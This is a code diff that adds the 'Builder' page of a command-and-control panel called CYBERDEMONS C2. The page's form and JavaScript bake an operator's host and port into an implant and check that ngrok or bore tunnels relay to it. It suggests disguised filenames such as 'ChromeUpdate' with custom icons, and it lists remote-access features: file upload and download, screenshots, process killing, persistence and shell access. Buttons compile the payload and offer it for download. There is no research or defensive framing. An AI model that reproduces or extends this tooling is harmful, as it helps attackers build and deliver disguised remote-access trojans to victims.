@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#0a0a0f">
+<title>Builder - CYBERDEMONS C2</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root {
+  --cyan:#00fff0; --magenta:#ff00ff; --green:#39ff14;
+  --red:#ff0040; --yellow:#ffea00; --bg:#05050a;
+  --surface:rgba(8,8,20,0.85); --card:rgba(12,12,30,0.9);
+  --border:rgba(0,255,240,0.12); --border-h:rgba(0,255,240,0.35);
+  --dim:#5a5a7a; --bright:#d0d0ff;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  font-family:'JetBrains Mono','Share Tech Mono',monospace;
+  background:var(--bg);color:var(--bright);
+  min-height:100vh;position:relative;
+}
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;
+  background:linear-gradient(rgba(0,255,240,0.015) 1px,transparent 1px),
+              linear-gradient(90deg,rgba(0,255,240,0.015) 1px,transparent 1px);
+  background-size:50px 50px;pointer-events:none;
+}
+body::after{
+  content:'';position:fixed;inset:0;z-index:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);
+  pointer-events:none;animation:scanlines 8s linear infinite;
+}
+@keyframes scanlines{0%{transform:translateY(0);}100%{transform:translateY(4px);}}
+body.has-bg::before{display:none;}
+body.has-bg::after{opacity:0.5;}
+
+/* === TOP BAR === */
+.topbar{
+  padding:10px 20px;background:var(--surface);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:12px;
+  position:sticky;top:0;z-index:10;
+  backdrop-filter:blur(20px);
+}
+.topbar::after{
+  content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),var(--magenta),var(--cyan),transparent);
+  opacity:0.4;
+}
+.topbar-logo{
+  width:30px;height:30px;border:1px solid var(--cyan);
+  display:flex;align-items:center;justify-content:center;
+  font-size:14px;color:var(--cyan);flex-shrink:0;
+  clip-path:polygon(15% 0%,100% 0%,85% 100%,0% 100%);
+  background:rgba(0,255,240,0.05);overflow:hidden;
+}
+.topbar-logo img{width:100%;height:100%;object-fit:cover;}
+.topbar-title{
+  font-family:'Orbitron',monospace;font-size:15px;font-weight:900;
+  color:var(--cyan);letter-spacing:3px;
+}
+.topbar-title span{color:var(--magenta);}
+.topbar-title small{
+  font-size:9px;color:var(--dim);font-family:'JetBrains Mono',monospace;
+  letter-spacing:0;margin-left:8px;
+}
+.topbar-back{
+  margin-left:auto;text-decoration:none;font-size:10px;
+  padding:6px 14px;border-radius:4px;font-weight:700;
+  color:var(--dim);border:1px solid var(--border);
+  font-family:'JetBrains Mono',monospace;text-transform:uppercase;
+  letter-spacing:1px;transition:all .2s;
+}
+.topbar-back:hover{color:var(--cyan);border-color:rgba(0,255,240,0.3);background:rgba(0,255,240,0.05);}
+
+/* === CONTENT === */
+.content{
+  max-width:640px;margin:0 auto;padding:20px;
+  position:relative;z-index:1;
+}
+
+/* === CYBER CARD === */
+.cc{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:8px;padding:20px;margin-bottom:16px;
+  position:relative;overflow:hidden;
+  backdrop-filter:blur(10px);
+  transition:border-color .3s,box-shadow .3s;
+}
+.cc:hover{border-color:var(--border-h);box-shadow:0 0 20px rgba(0,255,240,0.06);}
+.cc::before,.cc::after{
+  content:'';position:absolute;width:12px;height:12px;
+  border-color:var(--cyan);border-style:solid;opacity:0.3;
+  transition:opacity .3s;
+}
+.cc::before{top:-1px;left:-1px;border-width:1px 0 0 1px;}
+.cc::after{bottom:-1px;right:-1px;border-width:0 1px 1px 0;}
+.cc:hover::before,.cc:hover::after{opacity:0.7;}
+.cc .glow-line{
+  position:absolute;top:0;left:25%;right:25%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),transparent);
+  opacity:0.3;
+}
+.cc-title{
+  font-family:'Orbitron',monospace;font-size:9px;
+  text-transform:uppercase;letter-spacing:2px;color:var(--dim);
+  margin-bottom:16px;display:flex;align-items:center;gap:6px;
+}
+.cc-title .accent{color:var(--cyan);}
+
+/* === FORM === */
+.fg{margin-bottom:14px;}
+.fg label{
+  display:block;font-size:9px;text-transform:uppercase;
+  letter-spacing:1.5px;color:var(--dim);margin-bottom:6px;
+  font-family:'JetBrains Mono',monospace;
+}
+.fg input,.fg select{
+  width:100%;background:rgba(0,0,0,0.5);
+  border:1px solid var(--border);border-radius:4px;
+  padding:11px 14px;color:var(--bright);
+  font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;
+  transition:all .2s;
+}
+.fg input:focus,.fg select:focus{
+  border-color:var(--cyan);box-shadow:0 0 10px rgba(0,255,240,0.1);
+}
+.fg .hint{font-size:9px;color:var(--dim);margin-top:6px;}
+.fg .hint strong{color:var(--cyan);}
+.fr{display:flex;gap:10px;}
+.fr .fg{flex:1;}
+
+/* === BUTTONS === */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;
+  padding:11px 18px;border-radius:4px;border:none;
+  color:var(--bright);font-family:'JetBrains Mono',monospace;
+  font-size:10px;cursor:pointer;transition:all .2s;
+  text-decoration:none;gap:4px;font-weight:700;
+  text-transform:uppercase;letter-spacing:1px;
+  position:relative;overflow:hidden;
+}
+.btn::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,0.05),transparent);
+  opacity:0;transition:opacity .2s;
+}
+.btn:hover::before{opacity:1;}
+.btn:active{transform:scale(0.97);}
+.btn-c{background:rgba(0,255,240,0.12);color:var(--cyan);border:1px solid rgba(0,255,240,0.3);}
+.btn-c:hover{background:rgba(0,255,240,0.2);box-shadow:0 0 15px rgba(0,255,240,0.3);}
+.btn-g{background:rgba(57,255,20,0.12);color:var(--green);border:1px solid rgba(57,255,20,0.3);}
+.btn-g:hover{background:rgba(57,255,20,0.2);box-shadow:0 0 15px rgba(57,255,20,0.3);}
+.btn-fw{width:100%;justify-content:center;}
+.btn-sm{padding:7px 14px;font-size:9px;}
+.btn:disabled{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}
+
+/* === OUTPUT === */
+.out{
+  background:rgba(0,0,0,0.6);border:1px solid var(--border);
+  border-radius:4px;padding:14px;font-size:11px;line-height:1.6;
+  min-height:60px;max-height:200px;overflow-y:auto;white-space:pre-wrap;
+  word-break:break-all;color:var(--green);margin-top:12px;
+  font-family:'Share Tech Mono',monospace;
+}
+.out::-webkit-scrollbar{width:4px;}
+.out::-webkit-scrollbar-thumb{background:rgba(0,255,240,0.2);border-radius:4px;}
+.out a{color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(0,255,240,0.3);}
+.out a:hover{border-bottom-color:var(--cyan);}
+
+/* === STATUS BAR === */
+.sb{
+  display:flex;align-items:center;gap:8px;margin-top:10px;
+  font-size:10px;color:var(--dim);
+}
+.sb .dot{width:7px;height:7px;border-radius:50%;}
+.sb .dot.idle{background:var(--dim);}
+.sb .dot.run{background:var(--yellow);animation:pl 1s infinite;}
+.sb .dot.ok{background:var(--green);box-shadow:0 0 6px var(--green);}
+.sb .dot.fail{background:var(--red);}
+@keyframes pl{0%,100%{opacity:1;}50%{opacity:0.3;}}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-logo" id="hdrLogoEl">&#9881;</div>
+  <div class="topbar-title">BUILDER <small>v2.0</small></div>
+  <a href="/" class="topbar-back">&#8592; C2 DASHBOARD</a>
+</div>
+
+<div class="content">
+  <div class="cc">
+    <div class="glow-line"></div>
+    <div class="cc-title"><span class="accent">&#9670;</span> C2 Connection</div>
+    <div class="fr">
+      <div class="fg">
+        <label>Host / IP</label>
+        <input type="text" id="bhost" placeholder="e.g. 192.168.1.100">
+      </div>
+      <div class="fg" style="flex:0 0 110px;">
+        <label>Port</label>
+        <input type="number" id="bport" placeholder="7777">
+      </div>
+    </div>
+    <button class="btn btn-c btn-fw" onclick="saveCfg()" id="saveBtn">Save Config</button>
+    <div class="sb"><span class="dot idle" id="cfgDot"></span><span id="cfgStat">Loaded</span></div>
+  </div>
+
+  <div class="cc">
+    <div class="glow-line"></div>
+    <div class="cc-title" style="justify-content:space-between;">
+      <span><span class="accent">&#9670;</span> Endpoint Check</span>
+      <span id="epState" style="color:var(--dim);font-size:9px;font-family:'JetBrains Mono',monospace;">checking...</span>
+    </div>
+    <div class="hint" style="margin-bottom:8px;">
+      The tunnel's public port changes whenever it restarts. Test before you
+      build &mdash; a wrong port is indistinguishable from a dead implant until
+      it reaches the target.
+    </div>
+    <div class="fr">
+      <div class="fg" style="flex:1;">
+        <label>Test host</label>
+        <input type="text" id="epHost" placeholder="bore.pub">
+      </div>
+      <div class="fg" style="flex:0 0 110px;">
+        <label>Test port</label>
+        <input type="number" id="epPort" placeholder="30185">
+      </div>
+    </div>
+    <div style="display:flex;gap:6px;">
+      <button class="btn btn-c btn-sm" style="flex:1;" onclick="epTest()" id="epTestBtn">Test</button>
+      <button class="btn btn-sm" style="flex:1;" onclick="epSave()">Save &amp; Sync</button>
+    </div>
+    <div class="out" id="epOut" style="margin-top:8px;">Not tested yet.</div>
+  </div>
+
+  <div class="cc">
+    <div class="glow-line"></div>
+    <div class="cc-title"><span class="accent">&#9670;</span> Payload Options</div>
+    <div class="fg">
+      <label>Platform</label>
+      <select id="bplat" onchange="updPrev()">
+        <option value="windows">Windows (.exe)</option>
+        <option value="linux">Linux (ELF)</option>
+      </select>
+    </div>
+    <div class="fg">
+      <label>Filename</label>
+      <input type="text" id="bname" value="payload" placeholder="e.g. ChromeUpdate" oninput="updPrev()">
+      <div class="hint">Output: <strong id="prevOut">payload.exe</strong></div>
+    </div>
+    <div class="fg" id="iconGroup">
+      <label>Custom Icon (.ico)</label>
+      <input type="file" id="iconFile" accept=".ico" style="padding:8px;font-size:12px;">
+      <div class="hint">Current: <span id="curIcon">app.ico</span></div>
+    </div>
+    <button class="btn btn-c btn-sm" onclick="upIcon()">Upload Icon</button>
+    <span id="iconStat" style="color:var(--green);font-size:10px;margin-left:8px;display:none;">Done</span>
+  </div>
+
+  <div class="cc">
+    <div class="glow-line"></div>
+    <div class="cc-title"><span class="accent">&#9670;</span> Build Profile</div>
+    <div class="fg">
+      <label style="display:flex;align-items:center;gap:8px;cursor:pointer;">
+        <input type="checkbox" id="minimalMode" style="width:auto;">
+        <span>Minimal (shell access only)</span>
+      </label>
+      <div class="hint">Removes <strong>!upload</strong>, <strong>!download</strong>,
+        <strong>!ls</strong>, <strong>!screenshot</strong>, <strong>!ps</strong>,
+        <strong>!kill</strong>, <strong>!sysinfo</strong> and <strong>!persist</strong>.
+        The handlers are not compiled in, so GDI32/CRYPT32/ADVAPI32/IPHLPAPI leave the
+        import table entirely. Bare commands still run through <code>cmd.exe /c</code>.</div>
+    </div>
+  </div>
+
+  <div class="cc">
+    <div class="glow-line"></div>
+    <div class="cc-title"><span class="accent">&#9670;</span> Compile</div>
+    <button class="btn btn-c btn-fw" onclick="startBuild()" id="buildBtn">Build Payload</button>
+    <a class="btn btn-g btn-fw" id="dlBtn" style="display:none;margin-top:8px;" href="#">&#8595; Download</a>
+    <div class="out" id="buildOut">Ready. Configure and build.</div>
+    <div class="sb"><span class="dot idle" id="buildDot"></span><span id="buildStat">Idle</span></div>
+  </div>
+</div>
+
+<script>
+async function api(url,opts){try{const r=await fetch(url,opts);return await r.json()}catch{return null}}
+
+async function loadCfg(){
+  const d=await api('/api/builder/config');
+  if(d){
+    document.getElementById('bhost').value=d.host||'';
+    document.getElementById('bport').value=d.port||'';
+    document.getElementById('curIcon').textContent=d.current_icon||'app.ico';
+  }
+  const ng=await api('/api/ngrok/status');
+  if(ng&&ng.running&&ng.host){document.getElementById('bhost').value=ng.host;document.getElementById('bport').value=ng.port;}
+  epLoad();
+}
+
+// ---- endpoint check -------------------------------------------------
+// Reads the baked value, the sidecar and the tunnel's local port so a stale
+// or half-configured endpoint is visible here instead of on the target.
+async function epLoad(){
+  const d=await api('/api/builder/endpoint');
+  if(!d)return;
+  const el=document.getElementById('epState');
+  const ts=d.tunnels||[];
+  if(d.mismatch){
+    el.textContent=`MISMATCH built ${d.baked_host}:${d.baked_port} / cfg ${d.cfg_host}:${d.cfg_port}`;
+    el.style.color='var(--red)';
+  }else if(d.endpoint_matches_tunnel===false){
+    // The build points at a public port the tunnel is not publishing. ngrok
+    // allocates a new one every restart, so this is the usual reason a build
+    // that worked yesterday connects to nothing today.
+    el.textContent=`STALE TUNNEL PORT: built ${d.baked_host}:${d.baked_port} but the tunnel publishes `+
+      `${d.tunnel_public.host}:${d.tunnel_public.port}`;
+    el.style.color='var(--red)';
+  }else if(ts.length){
+    // More than one tunnel can be running and they can point at different
+    // ports, so show all of them instead of guessing which is live.
+    el.textContent=ts.map(t=>`${t.tool}->:${t.local_port}`+
+      (t.has_listener?'':' NO-LISTENER')).join('  ');
+    el.style.color=ts.some(t=>!t.has_listener)?'var(--amber)':'var(--dim)';
+  }else{
+    el.textContent=`built ${d.baked_host}:${d.baked_port}`;
+    el.style.color='var(--dim)';
+  }
+  // Prefill from the sidecar if present, else the compiled value.
+  if(d.cfg_host)document.getElementById('epHost').value=d.cfg_host;
+  else if(d.baked_host&&d.baked_host!=='unknown')document.getElementById('epHost').value=d.baked_host;
+  if(d.cfg_port)document.getElementById('epPort').value=d.cfg_port;
+  else if(d.baked_port)document.getElementById('epPort').value=d.baked_port;
+}
+
+async function epTest(){
+  const h=document.getElementById('epHost').value.trim();
+  const p=parseInt(document.getElementById('epPort').value);
+  const out=document.getElementById('epOut'),btn=document.getElementById('epTestBtn');
+  if(!h||!p){out.textContent='Enter a host and port.';return;}
+  btn.disabled=true;btn.textContent='Testing...';out.textContent='Probing '+h+':'+p+' ...';
+  const d=await api('/api/builder/endpoint/test',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:h,port:p})});
+  btn.disabled=false;btn.textContent='Test';
+  // `error` is overloaded on this route: it carries a request-level failure
+  // ("Need a host and a port") *and* the probe's failure detail. Testing it
+  // alone bailed out on every unsuccessful probe, so the reason and the hint
+  // never reached the operator -- the one case they were written for. A probe
+  // response always carries `reason`; a rejected request never does.
+  if(!d||(d.error&&!d.reason)){out.textContent='Error: '+(d&&d.error||'no response');return;}
+  // `reachable` only means the TCP connect() returned 0. An ngrok edge whose
+  // account is out of TCP allowance still answers connect() and then refuses
+  // to relay, and an http/https forward accepts happily and can never carry a
+  // binary handshake -- so the verdict has to be the `reason`, not reachability.
+  let msg;
+  if(d.reachable&&d.relayed){
+    msg=`RELAYED in ${d.ms} ms  (${h}:${p}) -- an implant can reach this.`;
+  }else if(d.reachable){
+    msg=`CONNECTED BUT NOT RELAYED  (${h}:${p})\n${d.error||''}`;
+  }else{
+    msg=`NOT USABLE  (${h}:${p})\n${d.error||''}`;
+  }
+  if(d.hint)msg+='\n\n'+d.hint;
+  const ts=d.tunnels||[];
+  if(ts.length){
+    msg+='\nTunnels running:';
+    ts.forEach(t=>{msg+=`\n  ${t.tool} forwards localhost:${t.local_port} `+
+      (t.has_listener?'- listener up':'*** NO LISTENER ON THAT PORT ***')});
+  }else{
+    msg+='\nNo tunnel process detected (ngrok/bore).';
+  }
+  msg+=`\nListening C2 ports: ${(d.listeners_running||[]).join(', ')||'none'}`;
+  out.textContent=msg;
+  out.style.whiteSpace='pre-wrap';
+  epLoad();
+}
+
+async function epSave(){
+  const h=document.getElementById('epHost').value.trim();
+  const p=parseInt(document.getElementById('epPort').value);
+  const out=document.getElementById('epOut');
+  if(!h||!p){out.textContent='Enter a host and port.';return;}
+  const d=await api('/api/builder/endpoint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:h,port:p})});
+  if(d&&d.error){out.textContent='Error: '+d.error;return;}
+  // Keep the main C2 fields in step so Save Config agrees.
+  document.getElementById('bhost').value=h;
+  document.getElementById('bport').value=p;
+  out.textContent=`Saved. pay.cpp and ${d.cfg_path} now point at ${h}:${p}`;
+  epLoad();
+}
+
+loadCfg();
+
+function updPrev(){
+  const n=document.getElementById('bname').value.trim()||'payload';
+  const p=document.getElementById('bplat').value;
+  document.getElementById('prevOut').textContent=n+(p==='linux'?'.elf':'.exe');
+  const ig=document.getElementById('iconGroup');
+  ig.style.opacity=p==='linux'?'.4':'1';
+  document.getElementById('iconFile').disabled=p==='linux';
+}
+
+async function saveCfg(){
+  const h=document.getElementById('bhost').value.trim(),p=document.getElementById('bport').value;
+  const btn=document.getElementById('saveBtn');btn.disabled=true;btn.textContent='Saving...';
+  const d=await api('/api/builder/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:h,port:parseInt(p)})});
+  btn.disabled=false;btn.textContent='Save Config';
+  const st=document.getElementById('cfgStat'),dot=document.getElementById('cfgDot');
+  if(d&&d.saved){st.textContent=`Saved: ${d.host}:${d.port}`;dot.className='dot ok';}
+  else{st.textContent='Error';dot.className='dot fail';}
+}
+
+async function upIcon(){
+  const fi=document.getElementById('iconFile');
+  if(!fi.files.length){alert('Select a .ico file');return;}
+  const fd=new FormData();fd.append('icon',fi.files[0]);
+  const d=await api('/api/builder/icon',{method:'POST',body:fd});
+  if(d&&d.saved){document.getElementById('iconStat').style.display='inline';document.getElementById('curIcon').textContent=d.icon;}
+  else alert('Upload failed');
+}
+
+let bp=null;
+async function startBuild(){
+  const h=document.getElementById('bhost').value.trim(),p=document.getElementById('bport').value;
+  const plat=document.getElementById('bplat').value,n=document.getElementById('bname').value.trim()||'payload';
+  await api('/api/builder/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:h,port:parseInt(p)})});
+  const btn=document.getElementById('buildBtn');btn.disabled=true;btn.textContent='Building...';
+  document.getElementById('dlBtn').style.display='none';
+  document.getElementById('buildOut').textContent=`Building ${n} (${plat})...`;
+  const r=await api('/api/builder/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({app_name:n,platform:plat,minimal:document.getElementById('minimalMode').checked})});
+  if(r&&r.error){document.getElementById('buildOut').textContent=r.error;btn.disabled=false;btn.textContent='Build Payload';return;}
+  bp=setInterval(async()=>{
+    const s=await api('/api/builder/status');if(!s)return;
+    if(s.running){document.getElementById('buildOut').textContent='Compiling...';return;}
+    clearInterval(bp);bp=null;btn.disabled=false;btn.textContent='Build Payload';
+    const o=document.getElementById('buildOut'),dot=document.getElementById('buildDot'),st=document.getElementById('buildStat');
+    if(s.success){
+      dot.className='dot ok';st.textContent='Build OK';
+      o.innerHTML=`Build succeeded. <a href="/api/builder/download">Download ${s.exe_name||'payload'}</a>`;
+      document.getElementById('dlBtn').style.display='flex';document.getElementById('dlBtn').href='/api/builder/download';
+    } else {
+      dot.className='dot fail';st.textContent='Build failed';o.textContent=s.last_output||'Error';
+    }
+  },1000);
+}
+
+async function loadAssets(){
+  const d=await api('/api/settings');if(!d)return;
+  if(d.bg){document.body.style.backgroundImage=`url(${d.bg}?t=${Date.now()})`;document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.style.backgroundAttachment='fixed';document.body.classList.add('has-bg');}
+  if(d.logo){document.getElementById('hdrLogoEl').innerHTML=`<img src="${d.logo}?t=${Date.now()}" alt="logo">`;}
+}
+loadAssets();
+</script>
+</body>
+</html>
